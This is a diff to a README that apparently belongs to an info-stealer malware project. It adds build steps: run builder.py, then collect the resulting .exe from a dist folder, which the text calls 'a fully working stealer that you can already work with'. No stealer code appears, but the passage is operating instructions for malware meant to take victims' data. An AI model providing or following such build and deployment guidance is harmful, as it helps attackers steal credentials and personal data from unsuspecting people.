@@ -19,6 +19,12 @@ python3 -m venv venv
 ```
 venv/Scripts/Activate1.ps if you using powershell (now windows terminal) or venv/Scripts/activate.bat if using a cmd
 ```
+**3. Run builder.py and build a .exe file**
+```
+python3 builder.py
+```
+**4. Final step**
+*You have a folder dist, in it is your .exe file, this is a fully working stealer that you can already work with*
 
 There are builder .exe files in this stealer, to create the .exe file you must run builder.py.
 
